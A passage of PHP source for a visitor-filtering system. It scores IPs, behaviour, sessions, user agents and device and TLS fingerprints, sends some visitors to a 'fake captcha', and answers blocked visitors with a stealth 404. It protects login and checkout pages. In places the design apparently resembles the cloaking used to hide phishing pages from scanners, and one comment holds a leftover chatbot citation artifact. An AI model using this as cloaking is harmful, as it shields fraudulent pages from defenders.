                    is_proxy = VALUES(is_proxy),
                    is_vpn = VALUES(is_vpn),
                    is_tor = VALUES(is_tor),
                    is_datacenter = VALUES(is_datacenter),
                    cache_expires = VALUES(cache_expires)");
            $stmt->execute([$ip_address, $reputation_score, $is_proxy, $is_vpn, $is_tor, $is_datacenter]);

            if ($reputation_score < $threshold || $is_datacenter) {
                return ['blocked' => true, 'reason' => "IP reputation check failed: score $reputation_score, datacenter: $is_datacenter"];
            }
        }
        return ['blocked' => false, 'reason' => ''];
    } catch (Exception $e) {
        error_log("IP reputation check error: " . $e->getMessage());
        return ['blocked' => false, 'reason' => ''];
    }
}

function check_behavioral_patterns($ip_address, $session_id) {
    global $pdo, $settings;

    // thresholds (use settings if present, otherwise defaults)
    $threshold        = isset($settings['behavioral_analysis_threshold'])
                        ? (int)$settings['behavioral_analysis_threshold'] : 70;
    $guardSeconds     = isset($settings['behavioral_grace_seconds'])
                        ? (int)$settings['behavioral_grace_seconds'] : 20;     // give login pages time
    $guardInteractions= isset($settings['behavioral_guard_interactions'])
                        ? (int)$settings['behavioral_guard_interactions'] : 2;  // clicks+keys required
    $minSamples       = isset($settings['behavioral_min_samples'])
                        ? (int)$settings['behavioral_min_samples'] : 2;         // samples in last 10min

    // gather samples for this IP+session (last 10 minutes)
    $stmt = $pdo->prepare(
        "SELECT COUNT(*) AS cnt, MIN(human_score) AS min_score
           FROM behavioral_patterns
          WHERE ip_address = ?
            AND session_id  = ?
            AND created_at >= (NOW() - INTERVAL 10 MINUTE)"
    );
    $stmt->execute([$ip_address, $session_id]);
    $row       = $stmt->fetch(PDO::FETCH_ASSOC);
    $samples   = (int)($row['cnt'] ?? 0);
    $minScore  = isset($row['min_score']) ? (int)$row['min_score'] : null;

    // latest interaction counters from visitors
    $vi = $pdo->prepare(
        "SELECT click_events, keyboard_events, session_duration
           FROM visitors
          WHERE ip_address = ?
       ORDER BY created_at DESC, id DESC
          LIMIT 1"
    );
    $vi->execute([$ip_address]);
    $viRow = $vi->fetch(PDO::FETCH_ASSOC);
    $clicks = (int)($viRow['click_events'] ?? 0);
    $keys   = (int)($viRow['keyboard_events'] ?? 0);
    $secs   = (int)($viRow['session_duration'] ?? 0);

    // NEW GUARD:
    // Do NOT judge until we have enough time AND enough interactions AND enough samples.
    if ($samples < $minSamples || $secs < $guardSeconds || ($clicks + $keys) < $guardInteractions) {
        return ['blocked' => false, 'reason' => '']; // not enough signal yet
    }

    // If we do have enough signal, judge using the worst score seen in the window
    if ($minScore !== null && $minScore < $threshold) {
        $upd = $pdo->prepare(
            "UPDATE visitors
                SET is_bot = 1,
                    blocked = 1,
                    block_reason = ?,
                    behavioral_score = ?,
                    updated_at = NOW()
              WHERE ip_address = ?
           ORDER BY created_at DESC, id DESC
              LIMIT 1"
        );
        $upd->execute(['Behavioral analysis failed', $minScore, $ip_address]);

        return ['blocked' => true, 'reason' => 'Behavioral analysis failed: human score '.$minScore];
    }

    return ['blocked' => false, 'reason' => ''];
}






function check_session_analysis($ip_address, $session_id) {
    global $pdo, $settings;

    // ---- thresholds (tweakable via settings) ----
    $shortSecs      = (int)($settings['session_short_seconds']            ?? 12);   // "ultra-short" lifetime
    $burstViews     = (int)($settings['refresh_burst_views']              ?? 6);    // views that define a burst
    $longIdleSecs   = (int)($settings['zero_interaction_long_seconds']    ?? 1800); // 30m idle watcher
    $highViews      = (int)($settings['high_views_threshold']             ?? 80);   // crawler threshold
    $mobileQuickSec = (int)($settings['mobile_exempt_quick_seconds']      ?? 20);   // allow fast logins
    $mobileMaxIx    = (int)($settings['mobile_exempt_max_interactions']   ?? 8);    // tiny interactions allowlist

    // Pull latest session snapshot
    $stmt = $pdo->prepare("
        SELECT id, created_at, last_activity, page_views, session_duration,
               mouse_movements, keyboard_events, click_events, scroll_events
          FROM visitors
         WHERE ip_address = ?
      ORDER BY created_at DESC, id DESC
         LIMIT 1");
    $stmt->execute([$ip_address]);
    $v = $stmt->fetch(PDO::FETCH_ASSOC);
    if (!$v) return ['blocked' => false, 'reason' => ''];

    $views  = (int)($v['page_views'] ?? 0);
    $dur    = (int)($v['session_duration'] ?? 0);   // kept up-to-date by behavioral_report.php
    $mouse  = (int)($v['mouse_movements'] ?? 0);
    $keys   = (int)($v['keyboard_events'] ?? 0);
    $clicks = (int)($v['click_events'] ?? 0);
    $scroll = (int)($v['scroll_events'] ?? 0);
    $ix     = $mouse + $keys + $clicks + $scroll;

    // mobile hint is set earlier in check.php when UA matches Mobile/* (you already do this):contentReference[oaicite:1]{index=1}
    $isMobile = !empty($_SESSION['is_mobile']);

    // ---- MOBILE EXEMPTION: allow legit fast login flows ----
    // Very quick sessions with tiny interactions are common on phones.
    if ($isMobile && $dur <= $mobileQuickSec && $ix <= $mobileMaxIx) {
        return ['blocked' => false, 'reason' => ''];
    }

    // ---- RULE A: refresh burst with no human signal (ultra-short) ----
    // Multiple views in a few seconds and zero interaction => headless refresh / script
    if ($dur > 0 && $dur <= $shortSecs && $views >= $burstViews && $ix === 0) {
        return ['blocked' => true, 'reason' => "Session burst with no interaction ({$views} views / {$dur}s)"];
    }

    // ---- RULE B: zero-interaction long sitter (watcher/crawler) ----
    if ($dur >= $longIdleSecs && $mouse === 0 && $keys === 0 && $clicks === 0) {
        return ['blocked' => true, 'reason' => "Long idle with no interaction ({$dur}s)"];
    }

    // ---- RULE C: high-volume crawler signature (no mouse + minimal input) ----
    // Toughen threshold for mobile (to avoid punishing JS-heavy mobile pages)
    $hv = $isMobile ? (int)ceil($highViews * 1.5) : $highViews;
    if ($views >= $hv && $mouse === 0 && ($keys + $clicks + $scroll) <= 1) {
        return ['blocked' => true, 'reason' => "Crawler-like navigation ({$views} views, no mouse)"];
    }

    // Otherwise, allow
    return ['blocked' => false, 'reason' => ''];
}


/* ===== Existing util functions (unchanged) ===== */

function handle_captcha($ip_address) {
    if (!empty($_SESSION['captcha_passed'])) return;
    $_SESSION['return_after_captcha'] = $_SERVER['REQUEST_URI'] ?? '/';
    show_captcha();
}

function show_captcha() {
    /*
      Independent switches:
      - captcha_enabled = old fake captcha.php
      - math_captcha_enabled = new math_captcha.php

      If math_captcha_enabled is ON, math captcha is used.
      If math_captcha_enabled is OFF and captcha_enabled is ON, old captcha.php is used.
    */
    global $settings;

    $use_math = false;
    if (function_exists('feature_enabled') && isset($settings) && is_array($settings)) {
        $use_math = feature_enabled($settings, ['math_captcha_enabled', 'math_captcha']);
    } elseif (function_exists('ab_setting_on')) {
        $use_math = ab_setting_on('math_captcha_enabled');
    }

    $file = $use_math ? 'math_captcha.php' : 'captcha.php';

    $base = rtrim(dirname($_SERVER['SCRIPT_NAME']), "/\\");
    $captcha_url = ($base === '' ? '' : $base) . '/' . $file;

    if (strpos($captcha_url, '/') !== 0) {
        $captcha_url = '/' . $captcha_url;
    }

    header('Location: ' . $captcha_url);
    exit();
}

function verify_turnstile($response, $ip_address) {
    $secret_key = getenv('TURNSTILE_SECRET_KEY') ?: '1x0000000000000000000000000000000AA';
    $url = 'https://challenges.cloudflare.com/turnstile/v0/siteverify';
    $data = ['secret'=>$secret_key,'response'=>$response,'remoteip'=>$ip_address];
    $options = ['http'=>['method'=>'POST','header'=>'Content-type: application/x-www-form-urlencoded','content'=>http_build_query($data),'timeout'=>5]];
    $context = stream_context_create($options);
    $verification = @file_get_contents($url, false, $context);
    if ($verification === false) { error_log('Turnstile verification failed: Could not connect to API or timeout. IP: ' . $ip_address); return false; }
    $result = json_decode($verification, true);
    return $result['success'] ?? false;
}

/* ===== UA loader (file-first, DB fallback) ===== */
if (!defined('BLOCKED_UA_FILE')) {
    define('BLOCKED_UA_FILE', __DIR__ . '/admin/blocked_user_agents.txt'); // one pattern per line
}

/**
 * Load UA patterns:
 *  1) from text file (fast, reliable)
 *  2) fallback to DB table `blocked_user_agents` (column: pattern)
 *  - cached in-memory per request; refreshes automatically when the file changes
 */
function ua_patterns_load(): array {
    static $cache = null, $stamp_seen = -1;

    $file = BLOCKED_UA_FILE;
    $stamp = @filemtime($file) ?: 0;

    if ($cache !== null && $stamp_seen === $stamp) {
        return $cache; // already loaded for this request with same file mtime
    }

    $patterns = [];

    // 1) File-first (skip blank lines and comments starting with # or ;)
    if (is_readable($file)) {
        $lines = file($file, FILE_IGNORE_NEW_LINES | FILE_SKIP_EMPTY_LINES) ?: [];
        foreach ($lines as $ln) {
            $ln = trim($ln);
            if ($ln === '' || $ln[0] === '#' || $ln[0] === ';') continue;
            $patterns[] = strtolower($ln);
        }
    }

    // 2) DB fallback if file missing/empty
    if (empty($patterns)) {
        try {
            global $pdo;
            if (isset($pdo)) {
                $stmt = $pdo->query("SELECT pattern FROM blocked_user_agents");
                foreach ($stmt->fetchAll(PDO::FETCH_COLUMN) as $p) {
                    $p = trim((string)$p);
                    if ($p !== '') $patterns[] = strtolower($p);
                }
            }
        } catch (Throwable $e) {
            // table might not exist; ignore
        }
    }

    // Dedupe while preserving order
    $seen = [];
    $out  = [];
    foreach ($patterns as $p) {
        if ($p !== '' && !isset($seen[$p])) {
            $seen[$p] = true;
            $out[] = $p;
        }
    }

    $cache = $out;
    $stamp_seen = $stamp;
    return $out;
}

/** Case-insensitive substring match against the loaded patterns */
function is_user_agent_blocked($user_agent) {
    $ua = strtolower($user_agent ?? '');
    if ($ua === '') return false;
    foreach (ua_patterns_load() as $needle) {
        if ($needle !== '' && strpos($ua, $needle) !== false) {
            return true;
        }
    }
    return false;
}


function is_ip_blocked($ip_address) {
    global $pdo;
    $stmt = $pdo->prepare("SELECT 1 FROM blocked_ips WHERE ip_address = ? LIMIT 1");
    $stmt->execute([$ip_address]);
    $result = $stmt->fetchColumn() !== false;
    // Debug logging for troubleshooting
    @file_put_contents(__DIR__ . '/logs/debug.log', date('Y-m-d H:i:s') . " - IP: $ip_address, Blocked: " . ($result ? 'Yes' : 'No') . PHP_EOL, FILE_APPEND);
    return $result;
}

function is_ip_whitelisted($ip_address) {
    global $pdo;
    $stmt = $pdo->prepare("SELECT 1 FROM whitelisted_ips WHERE ip_address = ? LIMIT 1");
    $stmt->execute([$ip_address]);
    return $stmt->fetchColumn() !== false;
}


function is_primary_page_request(): bool {
    $accept = $_SERVER['HTTP_ACCEPT'] ?? '';
    $xhr    = strtolower($_SERVER['HTTP_X_REQUESTED_WITH'] ?? '') === 'xmlhttprequest';
    $method = $_SERVER['REQUEST_METHOD'] ?? 'GET';
    $script = basename($_SERVER['SCRIPT_FILENAME'] ?? '');

    if ($xhr) return false;                      // ignore AJAX/XHR
    if ($method !== 'GET') return false;         // ignore POSTs (forms/telemetry)
    if (stripos($accept, 'text/html') === false) return false; // ignore assets/api
    // if you have other main pages, add them here:
    $primaryScripts = ['index.php','checkout.php','login.php'];
    return in_array($script, $primaryScripts, true);
}


function log_visitor($ip_address, $country, $user_agent, $is_bot, $reason = 'N/A') {
    global $pdo;
    $is_bot = $is_bot ? 1 : 0;

    // Get latest row for this IP
    $stmt = $pdo->prepare("SELECT id FROM visitors
                           WHERE ip_address = ?
                           ORDER BY created_at DESC, id DESC
                           LIMIT 1");
    $stmt->execute([$ip_address]);
    $visitor_id = $stmt->fetchColumn();

    if (!$visitor_id) {
        $stmt = $pdo->prepare("INSERT INTO visitors (ip_address, country, user_agent, is_bot, block_reason, page_views, created_at)
                               VALUES (?, ?, ?, ?, ?, 1, NOW())");
        $stmt->execute([$ip_address, $country, $user_agent, $is_bot, $reason]);
    } else {
        // Increment page_views if the column exists
		$cols = $pdo->query("SELECT COLUMN_NAME FROM information_schema.COLUMNS
							 WHERE TABLE_SCHEMA = DATABASE() AND TABLE_NAME = 'visitors'")
					->fetchAll(PDO::FETCH_COLUMN);
		$hasViews = in_array('page_views', $cols, true);
		$set = "is_bot = ?, block_reason = ?, updated_at = NOW()";

		// increment ONLY on main HTML pages (not XHR/assets)
		$primary = is_primary_page_request();
		if ($hasViews && $primary) {
			$set .= ", page_views = COALESCE(page_views,0) + 1";
		}

		$stmt = $pdo->prepare("UPDATE visitors SET $set WHERE id = ?");
		$stmt->execute([$is_bot, $reason, $visitor_id]);

    }
}


function block_and_mark_visitor($ip_address, $reason) {
    global $pdo;
    // Mark visitor row (create if missing)
    $stmt = $pdo->prepare("SELECT id FROM visitors WHERE ip_address = ? ORDER BY created_at DESC LIMIT 1");
    $stmt->execute([$ip_address]);
    $id = $stmt->fetchColumn();
    if ($id) {
        $stmt = $pdo->prepare("UPDATE visitors SET blocked = 1, block_reason = ?, updated_at = NOW() WHERE id = ?");
        $stmt->execute([$reason, $id]);
    } else {
        $stmt = $pdo->prepare("INSERT INTO visitors (ip_address, blocked, block_reason, created_at) VALUES (?, 1, ?, NOW())");
        $stmt->execute([$ip_address, $reason]);
    }

    // Add to blocked_ips if not present
    $stmt = $pdo->prepare("SELECT COUNT(*) FROM blocked_ips WHERE ip_address = ?");
    $stmt->execute([$ip_address]);
    if ((int)$stmt->fetchColumn() === 0) {
        $stmt = $pdo->prepare("INSERT INTO blocked_ips (ip_address, blocked_at, block_reason) VALUES (?, NOW(), ?)");
        $stmt->execute([$ip_address, $reason]);
    }

    // Debug logging for troubleshooting
    @file_put_contents(__DIR__ . '/logs/debug.log', date('Y-m-d H:i:s') . " - BLOCKED IP: $ip_address, Reason: $reason" . PHP_EOL, FILE_APPEND);
    // Stealth 404 (no HTML)
    ab_send_stealth_block(404);
}

function offline_country_lookup($ip) {
    try {
        $reader = new \GeoIp2\Database\Reader(__DIR__ . '/admin/GeoLite2-Country.mmdb');
        $record = $reader->country($ip);
        return strtoupper($record->country->isoCode ?? 'unknown');
    } catch (Exception $e) {
        @file_put_contents(__DIR__ . '/logs/geoip_error.log', date('Y-m-d H:i:s') . " - {$e->getMessage()}\n", FILE_APPEND);
        return null;
    }
}

function get_country_from_ip($ip) {
    global $pdo, $settings;
    if ($ip === '::1' || $ip === '127.0.0.1') return 'local';

    $cache_on = function_exists('ab_bool_setting') && isset($settings) && is_array($settings)
        ? ab_bool_setting($settings, ['advanced_cache_enabled'], true)
        : false;

    if ($cache_on && function_exists('ab_cache_get') && isset($pdo)) {
        $cached = ab_cache_get($pdo, 'country:' . $ip);
        if ($cached !== null && $cached !== '') return $cached;
    }

    $local = offline_country_lookup($ip);
    if ($local !== null) {
        if ($cache_on && function_exists('ab_cache_set') && isset($pdo)) {
            ab_cache_set($pdo, 'country:' . $ip, $local, 604800);
        }
        return $local;
    }

    @file_put_contents(__DIR__ . '/logs/country_fail_safe.log', date('Y-m-d H:i:s') . " IP: $ip - No country found
", FILE_APPEND);
    return 'unknown';
}

function ip_in_range($ip, $range) {
    if (function_exists('ab_ip_in_cidr')) {
        return ab_ip_in_cidr((string)$ip, (string)$range);
    }

    // Legacy IPv4 fallback
    if (strpos($range, '/') === false) return $ip === $range;
    [$subnet, $netmask] = explode('/', $range);
    $netmask = (int)$netmask;
    $ip_long = ip2long($ip);
    $range_long = ip2long($subnet);
    if ($ip_long === false || $range_long === false) return false;
    $ip_decimal    = sprintf('%u', $ip_long);
    $range_decimal = sprintf('%u', $range_long);
    $mask = $netmask === 0 ? 0 : (~((1 << (32 - $netmask)) - 1)) & 0xFFFFFFFF;
    return (($ip_decimal & $mask) === ($range_decimal & $mask));
}


function ip_matches_wildcard($ip, $wildcard) {
    $pattern = str_replace(['.', '*'], ['\.', '\d+'], trim($wildcard));
    return (bool)preg_match("/^{$pattern}$/", $ip);
}

function is_ip_in_static_blocklist($ip_address) {
    $file = __DIR__ . '/admin/static_blocked_ranges.txt';
    if (!is_file($file)) return false;
    $lines = file($file, FILE_IGNORE_NEW_LINES | FILE_SKIP_EMPTY_LINES);
    foreach ($lines as $line) {
        $line = trim(explode('#', $line)[0]);
        if ($line === '') continue;
        if (strpos($line, '/') !== false && ip_in_range($ip_address, $line)) return $line;
        if (strpos($line, '*') !== false && ip_matches_wildcard($ip_address, $line)) return $line;
        if (filter_var($line, FILTER_VALIDATE_IP) && $ip_address === $line) return $line;
    }
    return false;
}


function check_device_fingerprint($ip_address) {
    global $pdo;
    $stmt = $pdo->prepare("SELECT device_id FROM visitors WHERE ip_address=? ORDER BY created_at DESC, id DESC LIMIT 1");
    $stmt->execute([$ip_address]);
    $dev = strtolower((string)$stmt->fetchColumn());
    if ($dev === '') return ['blocked'=>false,'reason'=>''];

    $q = $pdo->prepare("SELECT is_suspicious, label FROM device_fingerprints WHERE device_id=? LIMIT 1");
    $q->execute([$dev]);
    if ($row = $q->fetch(PDO::FETCH_ASSOC)) {
        if (!empty($row['is_suspicious'])) {
            $label = $row['label'] ? " ({$row['label']})" : '';
            return ['blocked'=>true, 'reason'=>"Suspicious device fingerprint$label"];
        }
    }
    return ['blocked'=>false,'reason'=>''];
}

function check_tls_fingerprint($ip_address) {
    // Will only work if a proxy passes X-JA3/CF headers; harmless otherwise
    global $pdo;
    $ja3 = strtolower(trim($_SERVER['HTTP_X_JA3'] ?? $_SERVER['HTTP_CF_JA3'] ?? ''));
    if ($ja3 === '') return ['blocked'=>false,'reason'=>''];
    $q = $pdo->prepare("SELECT is_suspicious, label FROM tls_fingerprints WHERE ja3_hash=? LIMIT 1");
    $q->execute([$ja3]);
    if ($row = $q->fetch(PDO::FETCH_ASSOC)) {
        if (!empty($row['is_suspicious'])) {
            $label = $row['label'] ? " ({$row['label']})" : '';
            return ['blocked'=>true, 'reason'=>"TLS fingerprint blocked: $ja3$label"];
        }
    }
    return ['blocked'=>false,'reason'=>''];
}






function block_access($message) {    ab_send_stealth_block(404);
}

